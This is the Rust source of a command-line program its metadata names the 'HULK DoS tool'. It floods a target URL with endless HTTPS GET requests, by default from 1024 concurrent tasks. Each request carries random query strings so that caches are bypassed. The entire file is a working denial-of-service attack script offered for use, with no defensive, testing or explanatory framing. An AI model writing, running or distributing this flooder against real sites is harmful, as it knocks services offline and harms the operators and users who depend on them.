use clap::Parser;
use hyper::{Client, Uri};
use hyper::body::HttpBody as _;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;
use futures::future::join_all;
use hyper_tls::HttpsConnector;

#[derive(Parser, Debug)]
#[clap(author = "Hexalyse", about = "HULK DoS tool")]
struct CliArguments {
    #[clap(short, long, default_value = "1024")]
    /// Maximum number of concurrent connections to the target
    max_connections: usize,
    /// Target URL (eg. http://example.com)
    target: String,
}

fn random_string(n: usize) -> String {
    thread_rng().sample_iter(&Alphanumeric)
                .take(n)
                .map(char::from)
                .collect()
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let args = CliArguments::parse();

    // let tasks = (0..args.max_connections).map(|x| {
    //     fetch_url(args.target.clone(), x)
    // });
    // join_all(tasks).await;
    let tasks = (0..args.max_connections).map(|x| {
        let target = args.target.clone();
        tokio::spawn(async move {
            fetch_url(target, x).await
        })
    });
    join_all(tasks).await;
    
    Ok(())
}

async fn fetch_url(target: String, thread: usize) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let https = HttpsConnector::new();
    let client = Client::builder()
        .build::<_, hyper::Body>(https);
    //let client = Client::new();
    let mut i = 0;
    loop {
        i += 1;
        let uri_string = format!("{}?{}={}", target, random_string(10), random_string(10));
        let uri = uri_string.parse::<Uri>()?;
        let mut resp = client.get(uri).await?;
        if resp.status() != hyper::StatusCode::OK {
            println!("Request {} of thread {}: {}", i, thread, resp.status());
        }
        // println!("Request {} of thread {}: {}", i, thread, resp.status());
        resp.body_mut().data().await;
    }
}